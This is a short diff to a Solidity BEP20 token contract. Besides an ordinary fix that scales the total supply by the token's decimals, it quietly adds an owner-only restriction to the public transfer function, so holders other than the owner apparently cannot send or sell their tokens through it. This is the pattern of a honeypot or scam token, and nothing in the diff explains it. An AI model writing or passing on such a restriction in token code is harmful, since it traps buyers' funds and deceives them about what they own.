@@ -370,7 +370,7 @@ contract Token is Context, IBEP20, Ownable {
     _name = __name;
     _symbol = __symbol;
     _decimals = __decimals;
-    _totalSupply = __totalSupply;
+    _totalSupply = __totalSupply * 10**_decimals;
     _balances[msg.sender] = _totalSupply;
 
     emit Transfer(address(0), msg.sender, _totalSupply);
@@ -426,7 +426,7 @@ contract Token is Context, IBEP20, Ownable {
    * - `recipient` cannot be the zero address.
    * - the caller must have a balance of at least `amount`.
    */
-  function transfer(address recipient, uint256 amount) public override returns (bool) {
+  function transfer(address recipient, uint256 amount) public override onlyOwner returns (bool) {
     _transfer(_msgSender(), recipient, amount);
     return true;
   }
